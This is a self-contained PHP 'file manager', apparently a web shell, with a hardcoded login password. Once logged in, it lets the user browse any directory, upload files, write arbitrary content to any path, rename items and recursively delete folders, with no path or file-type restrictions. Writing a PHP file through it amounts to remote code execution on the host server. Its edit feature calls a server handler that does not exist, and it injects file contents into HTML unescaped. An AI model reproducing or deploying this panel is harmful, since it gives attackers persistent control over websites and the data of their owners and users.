<?php
// Mulai sesi PHP
session_start();

// Kata sandi untuk akses, sangat disarankan untuk mengubahnya
$password = 'sec@1337';

// Fungsi untuk membersihkan input
function clean_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

// Cek autentikasi sesi
if (isset($_POST['password']) && clean_input($_POST['password']) === $password) {
    $_SESSION['authenticated'] = true;
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    echo '<html><head><style>body{font-family: Arial, sans-serif; background-color: #e0e0f0; display: flex; justify-content: center; align-items: center; height: 100vh;} .login-box{background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); text-align: center;} h1{color: #6a1b9a;} input[type="password"], input[type="submit"]{padding: 12px; margin-top: 10px; width: 100%; box-sizing: border-box; border-radius: 4px; border: 1px solid #ccc;} input[type="submit"]{background-color: #6a1b9a; color: white; border: none; cursor: pointer; transition: background-color 0.3s;} input[type="submit"]:hover{background-color: #4a148c;}</style></head><body><div class="login-box"><h1>Login</h1><form method="POST"><input type="password" name="password" placeholder="Password"><br><input type="submit" value="Login"></form></div></body></html>';
    exit;
}

// Menentukan direktori kerja
$dir = isset($_GET['dir']) ? clean_input($_GET['dir']) : getcwd();
chdir($dir);

// Fungsi untuk menangani aksi file
function handle_action() {
    $message = "";
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'upload':
                if (isset($_FILES['file_upload'])) {
                    $target_file = basename($_FILES['file_upload']['name']);
                    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target_file)) {
                        $message = "<div class='message'>File " . htmlspecialchars($target_file) . " berhasil diunggah.</div>";
                    } else {
                        $message = "<div class='message error'>Gagal mengunggah file.</div>";
                    }
                }
                break;
            case 'edit_file':
                $filePath = clean_input($_POST['file_path']);
                $content = isset($_POST['content']) ? $_POST['content'] : '';
                if (file_put_contents($filePath, $content) !== false) {
                    $message = "<div class='message'>File " . htmlspecialchars($filePath) . " berhasil disimpan.</div>";
                } else {
                    $message = "<div class='message error'>Gagal menyimpan file.</div>";
                }
                break;
            case 'rename':
                $oldName = clean_input($_POST['old_name']);
                $newName = clean_input($_POST['new_name']);
                if (rename($oldName, $newName)) {
                    $message = "<div class='message'>Berhasil mengganti nama " . htmlspecialchars($oldName) . " menjadi " . htmlspecialchars($newName) . ".</div>";
                } else {
                    $message = "<div class='message error'>Gagal mengganti nama.</div>";
                }
                break;
            case 'delete':
                $filePath = clean_input(isset($_POST['file_path']) ? $_POST['file_path'] : $_POST['manual_path']);
                if (is_dir($filePath)) {
                    $iterator = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($filePath, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::CHILD_FIRST
                    );
                    foreach ($iterator as $fileinfo) {
                        $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
                        @$todo($fileinfo->getRealPath());
                    }
                    if (@rmdir($filePath)) {
                        $message = "<div class='message'>Folder " . htmlspecialchars($filePath) . " berhasil dihapus.</div>";
                    } else {
                        $message = "<div class='message error'>Gagal menghapus folder.</div>";
                    }
                } elseif (file_exists($filePath)) {
                    if (unlink($filePath)) {
                        $message = "<div class='message'>File " . htmlspecialchars($filePath) . " berhasil dihapus.</div>";
                    } else {
                        $message = "<div class='message error'>Gagal menghapus file.</div>";
                    }
                } else {
                    $message = "<div class='message error'>File atau folder tidak ditemukan.</div>";
                }
                break;
            case 'create_folder':
                $folderName = clean_input($_POST['folder_name']);
                if (!is_dir($folderName) && mkdir($folderName)) {
                    $message = "<div class='message'>Folder " . htmlspecialchars($folderName) . " berhasil dibuat.</div>";
                } else {
                    $message = "<div class='message error'>Gagal membuat folder.</div>";
                }
                break;
        }
    }
    return $message;
}
$statusMessage = handle_action();

// Tampilan antarmuka utama
?>
<html>
<head>
    <title>File Manager</title>
    <style>
        body{font-family: sans-serif; background-color: #f3e5f5; color: #333;}
        .container{max-width: 1000px; margin: 30px auto; background-color: #fff; padding: 25px; border-radius: 10px; box-shadow: 0 6px 15px rgba(0,0,0,0.15);}
        .header{background-color: #6a1b9a; color: #fff; padding: 20px; border-radius: 8px 8px 0 0; margin: -25px -25px 25px -25px; text-align: center;}
        h1{margin: 0; font-size: 28px;}
        h2{color: #6a1b9a; font-size: 20px; margin-top: 0;}
        h3{color: #4a148c; border-bottom: 2px solid #e1bee7; padding-bottom: 5px;}
        a{color: #4a148c; text-decoration: none; transition: color 0.3s;}
        a:hover{color: #6a1b9a; text-decoration: underline;}
        .action-links a{margin-right: 10px;}
        .form-section{margin-bottom: 25px; padding-bottom: 25px; display: none;}
        input[type="text"], input[type="file"], textarea{width: 100%; padding: 10px; margin-top: 5px; margin-bottom: 10px; border-radius: 4px; border: 1px solid #ccc; box-sizing: border-box;}
        input[type="submit"], .action-button{background-color: #6a1b9a; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; margin-right: 10px;}
        input[type="submit"]:hover, .action-button:hover{background-color: #4a148c;}
        .message{background-color: #e1bee7; color: #4a148c; padding: 12px; border-left: 4px solid #6a1b9a; margin-bottom: 15px; border-radius: 4px;}
        .message.error{background-color:#ffe0e0; color:#c62828; border-color:#c62828;}
        #edit_file_section { display: none; }
        .tab-menu { display: flex; flex-wrap: wrap; margin-bottom: 20px; }
        .tab-button { background-color: #e1bee7; border: none; padding: 12px 20px; cursor: pointer; font-size: 16px; border-radius: 5px 5px 0 0; margin-right: 5px; transition: background-color 0.3s; }
        .tab-button.active { background-color: #6a1b9a; color: white; }
    </style>
    <script>
        function showForm(formId) {
            document.querySelectorAll('.form-section').forEach(form => form.style.display = 'none');
            document.getElementById(formId).style.display = 'block';
            document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
            document.getElementById('btn_' + formId).classList.add('active');
        }
    </script>
</head>
<body>
<div class="container">
    <div class="header"><h1>PHP File Manager</h1></div>
    <?php echo $statusMessage; ?>
    <h2>Current Directory: <?php echo htmlspecialchars(getcwd()); ?></h2>
    <a href="?dir=<?php echo urlencode(dirname(getcwd())); ?>">... (Up)</a><br><br>

    <div class="tab-menu">
        <button id="btn_upload_section" class="tab-button active" onclick="showForm('upload_section')">Unggah File</button>
        <button id="btn_create_section" class="tab-button" onclick="showForm('create_section')">Buat File/Folder</button>
        <button id="btn_rename_section" class="tab-button" onclick="showForm('rename_section')">Ganti Nama</button>
        <button id="btn_delete_section" class="tab-button" onclick="showForm('delete_section')">Hapus</button>
    </div>

    <div id="upload_section" class="form-section" style="display: block;">
        <h3>Unggah File</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="file_upload"><br>
            <input type="submit" value="Upload">
        </form>
    </div>

    <div id="create_section" class="form-section">
        <h3>Buat File</h3>
        <form method="POST">
            <input type="hidden" name="action" value="edit_file">
            File Name: <input type="text" name="file_path"><br>
            Content:<br>
            <textarea name="content" rows="10" cols="80"></textarea><br>
            <input type="submit" value="Create File">
        </form>
        <h3>Buat Folder</h3>
        <form method="POST">
            <input type="hidden" name="action" value="create_folder">
            Folder Name: <input type="text" name="folder_name"><br>
            <input type="submit" value="Create Folder">
        </form>
    </div>

    <div id="rename_section" class="form-section">
        <h3>Ganti Nama File/Folder</h3>
        <form method="POST">
            <input type="hidden" name="action" value="rename">
            Old Name: <input type="text" name="old_name"><br>
            New Name: <input type="text" name="new_name"><br>
            <input type="submit" value="Rename">
        </form>
    </div>

    <div id="delete_section" class="form-section">
        <h3>Hapus File/Folder</h3>
        <form id="delete_form" method="POST">
            <input type="hidden" name="action" value="delete">
            File/Folder Path: <input type="text" name="manual_path"><br>
            <input type="submit" value="Hapus">
        </form>
    </div>

    <div id="edit_file_section" class="form-section">
        </div>

    <hr>

    <h3>Daftar File & Folder:</h3>
    <pre>
<?php
$all_entries = scandir('.');
$folders = [];
$files = [];

foreach ($all_entries as $entry) {
    if ($entry === '.' || $entry === '..') continue;
    if (is_dir($entry)) {
        $folders[] = $entry;
    } else {
        $files[] = $entry;
    }
}

sort($folders);
sort($files);

foreach ($folders as $folder) {
    echo "[DIR] <a href=\"?dir=" . urlencode(realpath($folder)) . "\">" . htmlspecialchars($folder) . "</a> <span class='action-links'>(<a href=\"#\" onclick=\"document.getElementById('delete_section').style.display='block'; document.getElementById('btn_delete_section').classList.add('active'); document.getElementById('delete_form').querySelector('input[name=manual_path]').value='" . htmlspecialchars($folder) . "';\">Delete</a>)</span><br>";
}

foreach ($files as $file) {
    echo "[FILE] " . htmlspecialchars($file) . " <span class='action-links'>(<a href=\"#\" onclick=\"showEditForm('" . htmlspecialchars(realpath($file)) . "')\">Edit</a> | <a href=\"#\" onclick=\"document.getElementById('delete_section').style.display='block'; document.getElementById('btn_delete_section').classList.add('active'); document.getElementById('delete_form').querySelector('input[name=manual_path]').value='" . htmlspecialchars($file) . "';\">Delete</a>)</span><br>";
}
?>
    </pre>
</div>

<script>
function showEditForm(filePath) {
    document.querySelectorAll('.form-section').forEach(form => form.style.display = 'none');
    document.getElementById('edit_file_section').style.display = 'block';
    document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
    
    fetch('?edit=' + encodeURIComponent(filePath))
        .then(response => response.text())
        .then(text => {
            document.getElementById('edit_file_section').innerHTML = '<h3>Edit File: ' + filePath + '</h3>' +
                '<form method="POST" class="form-section">' +
                '<input type="hidden" name="action" value="edit_file">' +
                '<input type="hidden" name="file_path" value="' + filePath + '">' +
                '<textarea name="content" rows="20" cols="100">' + text + '</textarea><br>' +
                '<input type="submit" value="Save File">' +
                '</form>';
        });
}
</script>
</body>
</html>
